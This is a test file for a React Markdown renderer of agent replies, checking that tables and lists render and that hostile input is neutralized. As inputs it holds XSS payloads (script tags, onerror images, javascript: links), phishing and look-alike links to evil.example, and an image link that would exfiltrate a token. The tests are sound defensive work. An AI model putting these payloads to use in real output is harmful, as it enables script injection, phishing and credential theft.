import assert from "node:assert/strict";
import { test } from "node:test";
import { renderToStaticMarkup } from "react-dom/server";
import ReplyText, { LinkedText, plain } from "../components/ReplyText";

const html = (text: string) => renderToStaticMarkup(<ReplyText text={text} />);

test("a table is a table", () => {
  const h = html("| Metric | Before |\n|---|---|\n| LCP | 2.9 s |");
  assert.match(h, /<table>/);
  assert.match(h, /<th[^>]*>Metric<\/th>/);
  assert.match(h, /<td[^>]*>2\.9 s<\/td>/);
  assert.doesNotMatch(h, /\|---/);
});

test("a wide table scrolls in its own box", () => {
  assert.match(html("| a |\n|---|\n| b |"), /class="md-table"/);
});

test("the Markdown agents write renders as what it means", () => {
  const h = html("## Next\n\n3. third\n4. fourth\n\n- one\n  - nested\n\n- [x] done\n\n> quoted\n\n*soft* and ~~gone~~ and **hard** and `code`");
  assert.match(h, /<h3>Next<\/h3>/);
  assert.match(h, /<ol start="3">/);
  assert.match(h, /<ul>\s*<li>nested/);
  assert.match(h, /type="checkbox"/);
  assert.match(h, /<blockquote>/);
  assert.match(h, /<em>soft<\/em>/);
  assert.match(h, /<del>gone<\/del>/);
  assert.match(h, /<strong>hard<\/strong>/);
  assert.match(h, /<code>code<\/code>/);
});

test("a code block keeps its text and offers to copy it", () => {
  const h = html("```js\nconst a = 1;\n```");
  assert.match(h, /<pre><code[^>]*>const a = 1;/);
  assert.match(h, /copy-btn/);
});

// What a reply must never be able to do: the page holds the sign-in token.
test("raw HTML is shown as text, never as markup", () => {
  const h = html('Hello <script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n<iframe src="https://evil.example"></iframe>');
  assert.doesNotMatch(h, /<script|<img|<iframe/);
  assert.match(h, /&lt;script&gt;/);
});

test("a link opens in a new tab that gets nothing from this page", () => {
  for (const t of ["[docs](https://example.com/a)", "<https://example.com/a>", "https://example.com/a"]) {
    const h = html(t);
    assert.match(h, /href="https:\/\/example\.com\/a"/, t);
    assert.match(h, /target="_blank"/, t);
    assert.match(h, /rel="noopener noreferrer nofollow"/, t);
  }
});

test("only a web address becomes a link", () => {
  for (const t of ["[x](javascript:alert(1))", "[x](data:text/html,hi)", "[x](file:///etc/passwd)", "[x](vbscript:msgbox(1))", "[x](/app/account)", "[x](mailto:a@b.co)"]) {
    const h = html(t);
    assert.doesNotMatch(h, /<a\b|href=/, t);
    assert.match(h, />x</, t);
  }
});

test("a link cannot hide where it goes", () => {
  assert.match(html("[click here](https://evil.example)"), /\(evil\.example\)/);
  assert.match(html("[paypal.com](https://evil.example)"), /\(evil\.example\)/);
  assert.match(html("[paypal.com/evil.example](https://evil.example)"), /\(evil\.example\)/);
  assert.match(html("[https://paypal.com](https://evil.example)"), /\(evil\.example\)/);
  assert.doesNotMatch(html("https://example.com/a"), /link-site/);
  assert.doesNotMatch(html("[www.example.com](https://example.com)"), /link-site/);
});

test("a link cannot hide behind a login part or look-alike letters", () => {
  assert.doesNotMatch(html("https://paypal.com@evil.example"), /<a\b/);
  assert.doesNotMatch(html("[x](https://paypal.com@evil.example)"), /<a\b/);
  assert.doesNotMatch(renderToStaticMarkup(<LinkedText text="https://paypal.com@evil.example" />), /<a\b/);
  assert.match(html("https://аpple.com"), /link-site/);
});

test("addresses in what a person typed become links, and nothing else changes", () => {
  const typed = (t: string) => renderToStaticMarkup(<LinkedText text={t} />);
  assert.match(typed("see https://example.com/a, please"), /<a href="https:\/\/example\.com\/a"[^>]*target="_blank"[^>]*>https:\/\/example\.com\/a<\/a>, please/);
  assert.match(typed("(https://example.com/a)."), /<\/a>\)\./);
  assert.equal(typed("no address here"), "no address here");
  assert.equal(typed("<b>not markup</b>"), "&lt;b&gt;not markup&lt;/b&gt;");
  assert.doesNotMatch(typed("javascript:alert(1)"), /<a/);
});

test("an image is never loaded, so it cannot carry anything out", () => {
  const h = html("![the secret](https://evil.example/?token=abc)");
  assert.doesNotMatch(h, /<img|evil\.example/);
  assert.match(h, /the secret/);
});

test("empty text is an empty reply, not a crash", () => {
  assert.match(html(""), /reply-text/);
});

test("a preview reads as words", () => {
  assert.equal(plain("| Metric | Before |\n|---|---|\n| LCP | 2.9 s |"), "Metric Before LCP 2.9 s");
  assert.equal(plain("> quoted **bold** [text](https://x.example)"), "quoted bold text");
  assert.equal(plain("before\n```\ncode\n```\nafter"), "before after");
});
